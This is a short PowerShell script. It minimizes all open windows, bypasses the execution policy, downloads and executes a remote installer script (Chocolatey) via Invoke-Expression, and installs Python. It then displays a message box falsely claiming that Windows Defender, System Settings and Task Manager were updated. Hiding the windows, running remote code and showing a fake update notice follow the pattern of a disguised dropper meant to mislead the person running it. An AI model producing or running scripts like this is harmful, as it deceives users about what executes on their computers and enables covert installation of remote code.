# Minimize the PowerShell terminal window
$shell = New-Object -ComObject Shell.Application
$shell.MinimizeAll()

# Execute the command
$command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
$command2 = "choco install python"

Invoke-Expression -Command $command
Invoke-Expression -Command $command2

Add-Type -AssemblyName System.Windows.Forms

$message = "Succesfuly updated 'Win Defender', 'System Settings', and 'Taskmanager' Click OK to continue."

$result = [System.Windows.Forms.MessageBox]::Show($message, "Update", [System.Windows.Forms.MessageBoxButtons]::OK)

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
   
}
